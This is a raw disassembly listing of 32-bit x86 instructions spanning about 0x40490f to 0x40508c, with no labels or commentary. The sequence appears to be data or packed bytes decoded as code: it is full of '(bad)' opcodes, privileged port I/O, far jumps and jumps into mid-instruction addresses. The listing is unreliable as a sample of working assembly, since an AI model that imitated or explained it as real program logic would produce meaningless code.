  40490f:	add    edx,ecx
  404911:	push   ss
  404912:	setl   bl
  404915:	sub    al,0x74
  404917:	sbb    DWORD PTR [eax],ecx
  404919:	pop    ebx
  40491a:	xor    esi,esi
  40491c:	sub    al,0x7e
  40491e:	mov    ds:0xfe7d6bf4,al
  404923:	pushf  
  404924:	xlat   BYTE PTR ds:[ebx]
  404925:	leave  
  404926:	inc    ebx
  404927:	imul   ebp,DWORD PTR [ebp-0x508ac4da],0xffffffee
  40492e:	imul   eax,DWORD PTR [eax],0xffffffac
  404931:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404932:	(bad)  
  404933:	call   0xbab6:0x25659bd6
  40493a:	ins    BYTE PTR es:[edi],dx
  40493b:	adc    eax,0xebcc499e
  404940:	lods   eax,DWORD PTR ds:[esi]
  404941:	pop    edi
  404942:	push   cs
  404943:	in     al,dx
  404944:	inc    esi
  404945:	ret    0x9d57
  404948:	dec    esp
  404949:	or     BYTE PTR [ecx],al
  40494b:	jne    0x40494f
  40494d:	(bad)  
  40494e:	call   0xadff:0x925b9ed2
  404955:	repnz push es
  404957:	test   BYTE PTR [eax+0x4ec16842],al
  40495d:	fld    DWORD PTR [edi+eax*2]
  404960:	add    al,0x48
  404963:	(bad)  
  404964:	jne    0x4048f0
  404966:	push   ebx
  404967:	jge    0x4049c3
  404969:	aam    0xab
  40496b:	test   cl,0xf3
  40496e:	ins    BYTE PTR es:[edi],dx
  40496f:	comiss xmm4,DWORD PTR [esi+0x4c7965c]
  404976:	arpl   WORD PTR [edx-0x528e2288],cx
  40497c:	stos   DWORD PTR es:[edi],eax
  40497d:	sbb    BYTE PTR [ebx],al
  40497f:	out    0xa3,eax
  404981:	jg     0x404966
  404983:	adc    edx,esi
  404985:	cs push 0xffffffce
  404988:	push   0xffffffd3
  40498a:	in     al,0xeb
  40498c:	sbb    ecx,DWORD PTR [ebx]
  40498e:	add    ch,bh
  404990:	popf   
  404991:	or     eax,0xa07bc891
  404996:	pop    esi
  404997:	pop    es
  404998:	test   eax,ebx
  40499a:	and    BYTE PTR [ebx-0x7c],0xa0
  40499e:	adc    esi,ecx
  4049a0:	es test eax,0x731a8714
  4049a6:	mov    BYTE PTR [ebp-0x1ad1c0df],dh
  4049ac:	imul   edi,DWORD PTR [esp+esi*2],0x6a
  4049b0:	enter  0x8614,0x90
  4049b4:	scas   al,BYTE PTR es:[edi]
  4049b5:	xchg   ebp,eax
  4049b6:	jnp    0x404959
  4049b8:	adc    BYTE PTR [eax],0x25
  4049bb:	(bad)  
  4049bc:	jge    0x4049b6
  4049be:	xchg   esi,eax
  4049bf:	(bad)  
  4049c0:	push   eax
  4049c1:	cmp    al,0xa4
  4049c3:	xchg   edi,eax
  4049c4:	push   es
  4049c5:	pop    ebp
  4049c6:	jne    0x4049af
  4049c8:	xchg   ebp,eax
  4049c9:	adc    DWORD PTR [edi+ebx*1-0x48],ebx
  4049cd:	lock pop ss
  4049cf:	int3   
  4049d0:	pusha  
  4049d1:	mov    ebp,0xa26d5bbe
  4049d6:	cwde   
  4049d7:	and    al,0x65
  4049d9:	mov    al,ds:0xd9f76456
  4049de:	dec    esi
  4049df:	aad    0x56
  4049e1:	dec    esi
  4049e2:	popa   
  4049e3:	and    al,0x8b
  4049e5:	pop    ebp
  4049e6:	pop    edi
  4049e7:	out    0x4a,al
  4049e9:	out    dx,al
  4049ea:	or     ch,dl
  4049ec:	pop    ss
  4049ed:	dec    ebp
  4049ee:	jl     0x404a22
  4049f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049f1:	rcr    DWORD PTR [ecx+eiz*8+0x68177f8d],0xed
  4049f9:	ins    DWORD PTR es:[edi],dx
  4049fa:	dec    edx
  4049fb:	aam    0x68
  4049fd:	xor    al,0xe1
  4049ff:	frstor [ebx]
  404a01:	mov    esi,?
  404a03:	mov    esp,0x5906a93a
  404a08:	and    eax,0x987a7cd6
  404a0d:	imul   ebx,DWORD PTR [ebx+0x17],0x7c41a397
  404a14:	aas    
  404a15:	sub    al,0x91
  404a17:	loopne 0x40499b
  404a19:	or     BYTE PTR [edi-0x2600cf16],bl
  404a1f:	push   edx
  404a20:	fstp   TBYTE PTR ds:0xa407022c
  404a26:	or     ah,BYTE PTR [edx+ecx*1]
  404a29:	xor    dl,BYTE PTR [esi+0x58800ce1]
  404a2f:	cmp    DWORD PTR [ebx-0x6c],edx
  404a32:	mov    ebx,DWORD PTR [ebp+0x33102d90]
  404a38:	lods   eax,DWORD PTR ds:[esi]
  404a39:	lds    esp,FWORD PTR [ebx-0x2a]
  404a3c:	adc    DWORD PTR [ecx+0x5d],0x32
  404a40:	(bad)  
  404a41:	sbb    BYTE PTR [edx+eax*1+0x32435eba],cl
  404a48:	packssdw mm3,QWORD PTR [esp+eax*2+0x54cf8a65]
  404a50:	dec    eax
  404a51:	sub    al,0x19
  404a53:	fsubr  DWORD PTR [esi+0x74]
  404a56:	js     0x404abc
  404a58:	popa   
  404a59:	out    dx,al
  404a5a:	(bad)  
  404a5b:	cld    
  404a5c:	fidiv  WORD PTR [ecx]
  404a5e:	pop    edx
  404a5f:	cs mov esi,ecx
  404a62:	push   edx
  404a63:	loop   0x4049ee
  404a65:	into   
  404a66:	scas   eax,DWORD PTR es:[edi]
  404a67:	jne    0x404a2f
  404a69:	fild   WORD PTR [eax+0x49]
  404a6c:	or     al,0xf
  404a6e:	jbe    0x404a1a
  404a70:	cwde   
  404a71:	xchg   edi,eax
  404a72:	mov    WORD PTR [edi+0x8],ss
  404a75:	jns    0x404ae3
  404a77:	xor    BYTE PTR [ebx],dh
  404a79:	push   ss
  404a7a:	add    al,0x58
  404a7c:	push   0x16
  404a7e:	xor    edi,DWORD PTR [edx]
  404a80:	push   ebx
  404a81:	lods   al,BYTE PTR ds:[esi]
  404a82:	test   eax,0x1bde58ab
  404a87:	jo     0x404a32
  404a89:	push   esi
  404a8a:	mov    esp,0x29c8e841
  404a8f:	lods   al,BYTE PTR ds:[esi]
  404a90:	ins    BYTE PTR es:[edi],dx
  404a91:	add    al,0x8f
  404a93:	fistp  WORD PTR [esi+0x3a016531]
  404a99:	jns    0x404a9e
  404a9b:	test   BYTE PTR [ebx+0x392a34ed],bh
  404aa1:	frstor [ecx+0x19]
  404aa4:	or     DWORD PTR [esi],eax
  404aa6:	rol    esi,0xc5
  404aa9:	pop    ebp
  404aaa:	pop    es
  404aab:	and    BYTE PTR [ebp+edx*1-0x75],0xbe
  404ab0:	loopne 0x404ae7
  404ab2:	push   0xfffffffc
  404ab4:	jmp    0xf86e4e6a
  404ab9:	cmp    esp,edx
  404abb:	jge    0x404a58
  404abd:	pop    esi
  404abe:	dec    eax
  404abf:	cs push esp
  404ac1:	sub    BYTE PTR [esi-0x1237749],0x7
  404ac8:	imul   esp,DWORD PTR [eax],0xfffffffb
  404acb:	stos   BYTE PTR es:[edi],al
  404acc:	xlat   BYTE PTR ds:[ebx]
  404acd:	sbb    BYTE PTR [esi],0x33
  404ad0:	dec    eax
  404ad1:	jmp    0x404a5e
  404ad3:	push   eax
  404ad4:	jge    0x404ae1
  404ad6:	push   eax
  404ad7:	shl    esi,1
  404ad9:	int3   
  404ada:	rcr    DWORD PTR [esp+ebx*8],cl
  404add:	push   0xaf2096a9
  404ae2:	sub    eax,0x777bcea4
  404ae7:	mov    ds:0x675221e0,al
  404aec:	fninit 
  404aee:	xor    al,0xf3
  404af0:	push   edi
  404af1:	sbb    esp,0x10
  404af4:	dec    esp
  404af5:	xchg   edi,eax
  404af6:	inc    esi
  404af7:	xchg   esp,eax
  404af8:	test   eax,0xbed8268d
  404afd:	fdivr  QWORD PTR cs:[ecx]
  404b00:	mov    bl,BYTE PTR [esi]
  404b02:	jns    0x404b79
  404b04:	sub    ch,BYTE PTR [ebx-0x4e]
  404b07:	sahf   
  404b08:	push   0xffffffe3
  404b0a:	cmp    esi,edi
  404b0c:	mov    edi,0x467d512f
  404b11:	jl     0x404b64
  404b13:	or     eax,0xa55ace9d
  404b18:	jne    0x404b5d
  404b1a:	xchg   edx,eax
  404b1b:	xor    eax,0x6a8764d0
  404b20:	lods   al,BYTE PTR ds:[esi]
  404b21:	jnp    0x404b06
  404b23:	jns    0x404b55
  404b25:	std    
  404b26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b27:	cmp    ebx,DWORD PTR [esi-0x1756b6a4]
  404b2d:	inc    ebx
  404b2e:	add    DWORD PTR [esi],ecx
  404b30:	push   ds
  404b31:	mov    ebx,0x1c436b0d
  404b36:	int3   
  404b37:	pop    es
  404b38:	mov    ah,0x42
  404b3a:	xor    esp,DWORD PTR [eax-0x44b68f30]
  404b40:	cmp    eax,0x491a3bc4
  404b45:	test   eax,0xdffbcab9
  404b4a:	mov    bh,0x78
  404b4c:	lods   al,BYTE PTR ds:[esi]
  404b4d:	fmul   st,st(5)
  404b4f:	stos   BYTE PTR es:[edi],al
  404b50:	ja     0x404b89
  404b52:	sbb    al,0x8f
  404b54:	xchg   esi,eax
  404b55:	fwait
  404b56:	sar    esi,cl
  404b58:	cmc    
  404b59:	pop    eax
  404b5a:	mov    BYTE PTR [esi],ch
  404b5c:	adc    eax,0x2a831d50
  404b62:	fs pop ss
  404b64:	ja     0x404be5
  404b66:	jmp    0xcfaa:0x2963d3ce
  404b6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b6e:	push   cs
  404b6f:	dec    edi
  404b70:	test   eax,0x4469719d
  404b75:	jecxz  0x404b99
  404b77:	and    esp,DWORD PTR [ecx+0x2c9cf6fe]
  404b7d:	in     eax,0x8f
  404b7f:	jl     0x404bfc
  404b81:	sbb    DWORD PTR [ecx+ecx*8-0x4e],0x30
  404b86:	xor    esi,ecx
  404b88:	sbb    eax,0xff16d3f
  404b8d:	xchg   esp,eax
  404b8e:	xor    al,BYTE PTR [edx-0x6d]
  404b91:	lock repz in al,0x1b
  404b95:	(bad)  [edx+0x76]
  404b98:	ins    DWORD PTR es:[edi],dx
  404b99:	sbb    edx,DWORD PTR [edx+0x0]
  404b9c:	dec    esi
  404b9d:	jl     0x404bf4
  404b9f:	sar    DWORD PTR es:[ecx-0x6b3f905],0xb3
  404ba7:	cmc    
  404ba8:	loop   0x404b2e
  404baa:	pop    ds
  404bab:	add    al,0xfc
  404bad:	out    dx,eax
  404bae:	jle    0x404c28
  404bb0:	and    al,0x3
  404bb2:	mov    dh,0xe0
  404bb4:	nop
  404bb5:	jns    0x404c06
  404bb7:	fcmovnbe st,st(2)
  404bb9:	fsubr  QWORD PTR [esp+edx*4]
  404bbc:	sub    BYTE PTR [eax+0x1a],ah
  404bbf:	imul   ecx,DWORD PTR [ebx-0x7f],0x6b
  404bc3:	sbb    ebx,DWORD PTR [eax+0x2a]
  404bc6:	mov    edx,0xba082221
  404bcb:	shr    cl,0xc8
  404bce:	js     0x404b50
  404bd0:	cmp    edi,ebx
  404bd2:	dec    ebp
  404bd3:	outs   dx,DWORD PTR ds:[esi]
  404bd4:	jl     0x404bcd
  404bd6:	sbb    BYTE PTR [ebp+0x42a4de1],dl
  404bdc:	ins    BYTE PTR es:[edi],dx
  404bdd:	add    cl,cl
  404bdf:	ret    
  404be0:	cmp    cl,bh
  404be2:	xor    eax,0x8b058db9
  404be7:	add    dh,BYTE PTR [ecx]
  404be9:	stos   DWORD PTR es:[edi],eax
  404bea:	adc    dl,0x26
  404bed:	int3   
  404bee:	mov    eax,ecx
  404bf0:	lahf   
  404bf1:	inc    edx
  404bf2:	stos   BYTE PTR es:[edi],al
  404bf3:	loopne 0x404b9f
  404bf5:	sub    dl,dl
  404bf7:	scas   al,BYTE PTR es:[edi]
  404bf8:	retf   0x960a
  404bfb:	iret   
  404bfc:	sub    DWORD PTR [edi+0x6b],edi
  404bff:	dec    eax
  404c00:	and    edi,esi
  404c02:	cmp    BYTE PTR [edx-0xb43067a],bl
  404c08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c09:	popa   
  404c0a:	pusha  
  404c0b:	adc    BYTE PTR [edx+0x7],0x5b
  404c0f:	lock scas al,BYTE PTR es:[edi]
  404c11:	jg     0x404c45
  404c13:	arpl   WORD PTR ds:0xce45612a,bx
  404c19:	jae    0x404baf
  404c1b:	push   edi
  404c1c:	fld    TBYTE PTR [eax-0x16]
  404c1f:	jmp    DWORD PTR [eax-0x76f0eece]
  404c25:	jge    0x404be8
  404c27:	aam    0x32
  404c29:	xor    dh,ch
  404c2b:	mov    WORD PTR [ecx],fs
  404c2d:	xchg   edx,eax
  404c2e:	mov    cl,0x8e
  404c30:	test   BYTE PTR [esi+0x31],bl
  404c33:	pop    esi
  404c34:	jecxz  0x404c32
  404c36:	dec    ecx
  404c37:	xor    BYTE PTR [ecx+edx*1],dl
  404c3a:	pop    ds
  404c3b:	pushf  
  404c3c:	mov    ecx,0x483368b7
  404c41:	mov    dl,0xa7
  404c43:	hlt    
  404c44:	retf   
  404c45:	jbe    0x404c52
  404c47:	imul   ebx,DWORD PTR [eax],0x195865f6
  404c4d:	dec    ecx
  404c4e:	rep ins DWORD PTR es:[edi],dx
  404c50:	stc    
  404c51:	jecxz  0x404c33
  404c53:	mov    al,BYTE PTR [eax+0x5]
  404c56:	or     esp,ebx
  404c58:	jo     0x404c38
  404c5a:	inc    edi
  404c5b:	(bad)  
  404c5c:	cld    
  404c5d:	dec    ebp
  404c5e:	add    al,0x8a
  404c60:	in     al,dx
  404c61:	add    eax,0xe53b17d6
  404c66:	icebp  
  404c67:	outs   dx,DWORD PTR ds:[esi]
  404c68:	enter  0x220e,0x62
  404c6c:	std    
  404c6d:	outs   dx,DWORD PTR ds:[esi]
  404c6e:	(bad)  
  404c6f:	js     0x404c63
  404c71:	fnstenv [ebx]
  404c73:	(bad)  
  404c74:	mov    al,0x92
  404c76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c77:	cwde   
  404c78:	sub    DWORD PTR [esi-0x39],edx
  404c7b:	fsub   st(5),st
  404c7d:	push   ecx
  404c7e:	ins    DWORD PTR es:[edi],dx
  404c7f:	stos   DWORD PTR es:[edi],eax
  404c80:	ins    DWORD PTR es:[edi],dx
  404c81:	and    dh,BYTE PTR [eax-0x76]
  404c84:	ins    DWORD PTR es:[edi],dx
  404c85:	push   cs
  404c86:	fdiv   QWORD PTR [edx-0x3409f75c]
  404c8c:	push   ss
  404c8d:	dec    esi
  404c8e:	adc    BYTE PTR [ebx],dl
  404c90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c91:	dec    esp
  404c92:	jns    0x404c15
  404c94:	jg     0x404c50
  404c96:	adc    BYTE PTR [ebx+0x2e9ad294],0xad
  404c9d:	mov    esp,DWORD PTR [edx+0xa]
  404ca0:	mov    bl,0x4f
  404ca2:	stc    
  404ca3:	xor    edi,0x40d57e63
  404ca9:	jns    0x404d02
  404cab:	in     eax,dx
  404cac:	mov    fs,WORD PTR [ebx-0x45635fb5]
  404cb2:	pusha  
  404cb3:	lods   al,BYTE PTR ds:[esi]
  404cb4:	in     al,0x9e
  404cb6:	inc    ebx
  404cb7:	adc    al,0x97
  404cb9:	cmp    DWORD PTR [esi+0x1f27bae7],ebx
  404cbf:	mul    BYTE PTR [ebx-0x7b]
  404cc2:	inc    esp
  404cc3:	push   edi
  404cc4:	pop    ebp
  404cc5:	xor    eax,0xf0d6d4ab
  404cca:	lahf   
  404ccb:	add    ecx,DWORD PTR [edi+eax*2-0x172eccbd]
  404cd2:	mov    ah,cl
  404cd4:	leave  
  404cd5:	ja     0x404cdd
  404cd7:	sbb    eax,0x4e7d7dfe
  404cdc:	int    0x1d
  404cde:	dec    ebx
  404cdf:	sbb    eax,0x1f930e5
  404ce4:	inc    ebp
  404ce5:	ret    
  404ce6:	ret    
  404ce7:	pop    ebx
  404ce8:	push   ds
  404ce9:	pop    eax
  404cea:	xor    BYTE PTR [ecx],ah
  404cec:	mov    eax,ds:0xba6d1b9e
  404cf1:	cmc    
  404cf2:	inc    edi
  404cf3:	xchg   edx,eax
  404cf4:	mov    ds:0xf569a112,eax
  404cf9:	xor    edi,DWORD PTR [ecx+0x2d]
  404cfc:	repnz fdivr st(2),st
  404cff:	popf   
  404d00:	add    edi,DWORD PTR [ecx+0x66ddde7a]
  404d06:	fadd   st(3),st
  404d08:	push   ds
  404d09:	inc    sp
  404d0b:	jge    0x404cba
  404d0d:	in     eax,dx
  404d0e:	hlt    
  404d0f:	rol    BYTE PTR [ebp+0x78816b29],1
  404d15:	cdq    
  404d16:	push   cs
  404d17:	or     al,0xea
  404d19:	cs xchg ebp,eax
  404d1b:	adc    BYTE PTR [ecx],bh
  404d1d:	shr    esi,0xad
  404d20:	call   0x23fb:0xf83d9239
  404d27:	dec    esi
  404d28:	and    edi,DWORD PTR [esi+0x60]
  404d2b:	ins    DWORD PTR es:[edi],dx
  404d2c:	rcl    DWORD PTR [eax-0xf9aeda0],0x16
  404d33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d34:	xchg   ecx,eax
  404d35:	mov    ebp,0x5694182f
  404d3a:	fbstp  TBYTE PTR [eax+0x17]
  404d3d:	call   FWORD PTR [eax-0x4c]
  404d40:	jmp    ecx
  404d42:	dec    eax
  404d43:	test   BYTE PTR [edi],al
  404d45:	and    edi,DWORD PTR [esp+edi*4+0x74]
  404d49:	cs aas 
  404d4b:	stos   BYTE PTR es:[edi],al
  404d4c:	cmp    edx,esi
  404d4e:	imul   edi,DWORD PTR [esi-0x34022551],0xa8cdd205
  404d58:	jmp    0x587608f7
  404d5d:	jmp    0xeb1ee401
  404d62:	push   ebx
  404d63:	fisub  DWORD PTR [esi-0x5b]
  404d66:	mov    DWORD PTR [ebp+0x15],0xb5d76ac
  404d6d:	inc    esi
  404d6e:	mov    dl,0x53
  404d70:	push   ebx
  404d71:	pusha  
  404d72:	pop    edx
  404d73:	pslld  mm1,mm2
  404d76:	fld    QWORD PTR [ebx]
  404d78:	fadd   st(0),st
  404d7a:	cli    
  404d7b:	lahf   
  404d7c:	push   ebp
  404d7d:	jmp    0xa8f91cea
  404d82:	pop    ebp
  404d83:	div    ah
  404d85:	loope  0x404d9e
  404d87:	xchg   edi,eax
  404d88:	xor    DWORD PTR [ecx-0x13f35462],esi
  404d8e:	pop    esp
  404d8f:	push   ds
  404d90:	stos   DWORD PTR es:[edi],eax
  404d91:	pop    ebx
  404d92:	adc    eax,0xae4e6a3d
  404d97:	cmp    al,0x6b
  404d99:	mov    cs,ebx
  404d9b:	cdq    
  404d9c:	fisubr DWORD PTR [ebp+0x71397652]
  404da2:	xchg   ebp,eax
  404da3:	add    DWORD PTR [ebx+0xf],ecx
  404da6:	(bad)  
  404da7:	mov    dh,0x58
  404da9:	dec    ebp
  404daa:	inc    esi
  404dab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404dac:	cmp    DWORD PTR [ebp+0x64],edx
  404daf:	leave  
  404db0:	outs   dx,DWORD PTR ds:[esi]
  404db1:	(bad)  
  404db2:	ret    
  404db3:	fs push esp
  404db5:	data16 mov bh,0x4f
  404db8:	ss jl  0x404d6d
  404dbb:	jg     0x404e06
  404dbd:	xlat   BYTE PTR ds:[ebx]
  404dbe:	mov    al,ds:0x97f749e2
  404dc3:	add    eax,DWORD PTR [ebx+edi*2+0x39]
  404dc7:	sub    BYTE PTR [ebx],dl
  404dc9:	adc    eax,0x5598be34
  404dce:	xor    edi,ecx
  404dd0:	sbb    eax,0xba8870bd
  404dd5:	ror    BYTE PTR [edi+0x50],0xe6
  404dd9:	popf   
  404dda:	mov    al,fs:0xd814a934
  404de0:	stos   DWORD PTR es:[edi],eax
  404de1:	shl    BYTE PTR ds:0xd9034868,1
  404de7:	sub    al,0xa7
  404de9:	push   ebp
  404dea:	in     eax,0x3c
  404dec:	sbb    eax,0x9454ddeb
  404df1:	cmc    
  404df2:	fld    TBYTE PTR [edx+0x6a214003]
  404df8:	int3   
  404df9:	in     al,dx
  404dfa:	cmc    
  404dfb:	cmc    
  404dfc:	adc    al,0xbb
  404dfe:	dec    esp
  404dff:	dec    esi
  404e00:	cmp    DWORD PTR [eax],eax
  404e02:	xor    DWORD PTR [edi],ecx
  404e04:	inc    ebp
  404e05:	jae    0x404e12
  404e07:	scas   al,BYTE PTR es:[edi]
  404e08:	adc    BYTE PTR [ecx-0x742f3dbe],ah
  404e0e:	inc    edx
  404e0f:	paddsw mm1,QWORD PTR [ecx]
  404e12:	xor    eax,0x96783533
  404e17:	push   ds
  404e18:	test   BYTE PTR [ecx+0x5ee37db6],dh
  404e1e:	pop    ds
  404e1f:	mov    edi,0x7608f872
  404e24:	adc    dh,bh
  404e26:	idiv   DWORD PTR [eax+0x4b]
  404e29:	add    BYTE PTR [ecx],dh
  404e2b:	push   ecx
  404e2c:	in     al,dx
  404e2d:	cmp    eax,ecx
  404e2f:	ret    
  404e30:	xor    DWORD PTR [ebx-0x56934505],ebp
  404e36:	call   0x586d7ee5
  404e3b:	mov    edx,0x5cc742b
  404e40:	adc    eax,0x7c33bcb
  404e45:	mov    WORD PTR ss:[eax],es
  404e48:	outs   dx,DWORD PTR ds:[esi]
  404e49:	fs clc 
  404e4b:	sub    eax,0x95e37604
  404e50:	xchg   ebx,eax
  404e51:	mov    ebp,0x8a824d04
  404e56:	mov    ah,ah
  404e58:	call   0xfdcb7b3d
  404e5d:	xchg   edi,eax
  404e5e:	inc    edx
  404e5f:	sub    eax,0xcbd9a02c
  404e64:	imul   DWORD PTR [ebx-0x75c21107]
  404e6a:	push   0x65
  404e6c:	call   0xf0ab:0x44f95d56
  404e73:	inc    ebx
  404e74:	retf   
  404e75:	cmp    edi,ecx
  404e77:	jmp    0x74d97ada
  404e7c:	test   DWORD PTR [ecx+0x6c],eax
  404e7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e80:	or     BYTE PTR [edi],bh
  404e82:	mov    BYTE PTR [edi-0x7d130f96],ch
  404e88:	add    DWORD PTR [edi+ecx*4],eax
  404e8b:	sub    dl,BYTE PTR [esi+0x2e]
  404e8e:	mov    al,ds:0x4444f706
  404e93:	pop    ds
  404e94:	push   es
  404e95:	fidiv  WORD PTR [ebx-0x4fcfc277]
  404e9b:	jnp    0x404e50
  404e9d:	neg    ebx
  404e9f:	xchg   edi,eax
  404ea0:	mov    ds:0x1651b0ce,eax
  404ea5:	(bad)  
  404ea6:	retf   0xb45b
  404ea9:	cmp    DWORD PTR [edi+0xae843e3],edx
  404eaf:	sub    eax,0x25cbfe5b
  404eb4:	nop
  404eb5:	and    al,0x99
  404eb7:	cmp    eax,0xb561b438
  404ebc:	jnp    0x404e7f
  404ebe:	lahf   
  404ebf:	(bad)  
  404ec0:	cli    
  404ec1:	sbb    edi,eax
  404ec3:	mov    cl,dl
  404ec5:	ret    0x1150
  404ec8:	and    al,0x86
  404eca:	(bad)  
  404ecb:	mov    dh,0x88
  404ecd:	outs   dx,DWORD PTR ds:[esi]
  404ece:	cmp    DWORD PTR [ebx-0x1a7b64da],esi
  404ed4:	in     al,dx
  404ed5:	add    DWORD PTR [ebx],0xffffff85
  404ed8:	out    0x64,eax
  404eda:	cwde   
  404edb:	dec    edx
  404edc:	cmp    BYTE PTR [esi-0x7b8488ad],ch
  404ee2:	movhps QWORD PTR [eax-0x6770b37c],xmm2
  404ee9:	repnz lea esi,[ebx-0x2aee072b]
  404ef0:	mov    eax,DWORD PTR [ebp+esi*8+0x4]
  404ef4:	jmp    0x9848:0xb3b540e8
  404efb:	test   DWORD PTR [edi+0x4a545dbe],ecx
  404f01:	mov    bh,0x2b
  404f03:	scas   al,BYTE PTR es:[edi]
  404f04:	mov    al,0x97
  404f06:	mov    DWORD PTR [ebx],ebp
  404f08:	ror    DWORD PTR [ecx-0x2728cf0b],0x39
  404f0f:	cmc    
  404f10:	mov    ds:0x1d69996a,eax
  404f15:	cmc    
  404f16:	test   BYTE PTR [eax],dh
  404f18:	adc    bh,BYTE PTR [edx+ecx*1-0x76]
  404f1c:	sub    BYTE PTR [eax+0x23],ah
  404f1f:	push   ecx
  404f20:	xchg   ebp,eax
  404f21:	dec    ebp
  404f22:	jp     0x404f05
  404f24:	jl     0x404ef1
  404f26:	std    
  404f27:	dec    ebp
  404f28:	into   
  404f29:	sbb    bh,BYTE PTR [esi-0x227cda6c]
  404f2f:	dec    esi
  404f30:	outs   dx,DWORD PTR ds:[esi]
  404f31:	dec    edx
  404f32:	pop    es
  404f33:	jb     0x404ef1
  404f35:	push   0xde7bc1eb
  404f3a:	outs   dx,BYTE PTR ds:[esi]
  404f3b:	mov    eax,0x71e1da48
  404f40:	outs   dx,DWORD PTR ds:[esi]
  404f41:	data16 mov ch,0xce
  404f44:	push   esp
  404f45:	mov    bh,0x70
  404f47:	mov    esi,DWORD PTR [eax]
  404f49:	cmp    DWORD PTR [edx-0x42],ebx
  404f4c:	sub    DWORD PTR [eax-0x5a],edi
  404f4f:	jge    0x404ef9
  404f51:	push   esi
  404f52:	push   ebp
  404f53:	je     0x404fa3
  404f55:	in     al,0xb7
  404f57:	lahf   
  404f58:	adc    eax,0xa7362d3f
  404f5d:	lahf   
  404f5e:	add    DWORD PTR [esi-0x73bd9ee4],ebx
  404f64:	(bad)  
  404f65:	js     0x404f87
  404f67:	sub    ebp,DWORD PTR [ebx+ebp*1]
  404f6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f6b:	test   BYTE PTR [esi+eiz*1+0x34],bh
  404f6f:	jbe    0x404f53
  404f71:	mov    ebx,0xa841bf8e
  404f76:	arpl   WORD PTR [ebx],sp
  404f78:	mul    DWORD PTR [eax+edi*4]
  404f7b:	jge    0x404f79
  404f7d:	mov    ebp,ecx
  404f7f:	inc    edi
  404f80:	mov    esi,0xd3660b7e
  404f85:	(bad)  
  404f87:	mov    ds:0x6897f565,al
  404f8c:	pop    eax
  404f8d:	popa   
  404f8e:	mov    DWORD PTR [edi],edx
  404f90:	fsubr  QWORD PTR [ebx+0x7e6505d1]
  404f96:	test   BYTE PTR [esi-0x43],cl
  404f99:	add    eax,0x388be71f
  404f9e:	test   al,0x4e
  404fa0:	mov    esi,0xd7f81122
  404fa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fa6:	inc    eax
  404fa7:	out    0xc3,al
  404fa9:	jmp    0x91d1:0x34ede2ad
  404fb0:	xor    BYTE PTR [edx-0x23],cl
  404fb3:	sub    edi,ebx
  404fb5:	add    dh,bh
  404fb7:	js     0x404fd2
  404fb9:	or     esp,DWORD PTR [esp+edx*8]
  404fbc:	push   edx
  404fbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fbe:	jl     0x8877af66
  404fc4:	std    
  404fc5:	outs   dx,DWORD PTR ds:[esi]
  404fc6:	daa    
  404fc7:	xchg   edx,eax
  404fc8:	add    eax,0xa4c4e782
  404fcd:	out    0x7d,al
  404fcf:	sub    ebx,esp
  404fd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fd2:	(bad)  
  404fd3:	imul   edx,DWORD PTR [ecx-0x400f03ed],0xffffffae
  404fda:	push   ss
  404fdb:	test   al,0xc
  404fdd:	icebp  
  404fde:	mov    dl,0xb7
  404fe0:	out    0x4c,al
  404fe2:	int3   
  404fe3:	cmp    eax,0xc4572033
  404fe8:	inc    esi
  404fe9:	and    dl,bl
  404feb:	cmp    bl,BYTE PTR [edx+edi*1+0x71ca797]
  404ff2:	add    dl,cl
  404ff4:	not    BYTE PTR [ecx-0x4b]
  404ff7:	out    0xb2,eax
  404ff9:	aam    0x41
  404ffb:	sub    DWORD PTR [edx-0x8],ecx
  404ffe:	xor    eax,0xe558309f
  405003:	add    ecx,DWORD PTR [ebx-0x32aefa37]
  405009:	dec    ebx
  40500a:	stos   BYTE PTR es:[edi],al
  40500b:	xor    ah,bh
  40500d:	cmp    DWORD PTR ds:0xd1bf16b8,ebx
  405013:	push   ebp
  405014:	das    
  405015:	mov    esp,0x319c0fed
  40501a:	sbb    BYTE PTR [ebx+0x321c3993],0x93
  405021:	xor    al,0xb8
  405023:	je     0x405018
  405025:	ficomp DWORD PTR [eax-0x80]
  405028:	mov    ch,0x49
  40502a:	jecxz  0x4050a7
  40502c:	xor    eax,0x4d0b6c72
  405031:	xor    eax,DWORD PTR [eax-0x1a]
  405034:	push   ss
  405035:	aad    0xb0
  405037:	inc    edi
  405038:	fs add eax,0x822a9c99
  40503e:	push   ecx
  40503f:	dec    ebx
  405040:	add    bl,cl
  405042:	loopne 0x404fd8
  405044:	jecxz  0x404fd3
  405046:	les    edx,FWORD PTR [eax]
  405048:	push   edi
  405049:	es pop edx
  40504b:	pop    ds
  40504c:	lock sub ebp,DWORD PTR [ecx-0x65]
  405050:	adc    dl,dh
  405052:	hlt    
  405053:	(bad)  
  405054:	dec    edi
  405055:	sub    ecx,DWORD PTR [esi+ebp*1-0x5add5dcf]
  40505c:	retf   
  40505d:	ins    BYTE PTR es:[edi],dx
  40505e:	ins    BYTE PTR es:[edi],dx
  40505f:	jo     0x405081
  405061:	sbb    al,bh
  405063:	sbb    esp,ebp
  405065:	std    
  405066:	or     al,0x0
  405068:	mov    ds,WORD PTR [esi-0x2e]
  40506b:	jp     0x4050bd
  40506d:	jle    0x4050d5
  40506f:	mov    ch,0x47
  405071:	cmp    eax,0xc39a1d53
  405076:	sbb    al,0x2d
  405078:	pushf  
  405079:	jnp    0x4050bf
  40507b:	add    al,0x3e
  40507d:	dec    esi
  40507e:	sub    DWORD PTR [eax-0x34f4eb90],ebx
  405084:	pusha  
  405085:	iret   
  405086:	imul   eax,DWORD PTR [ebx],0xffffffc2
  405089:	push   ss
  40508a:	jns    0x40510a
  40508c:	dec    edi
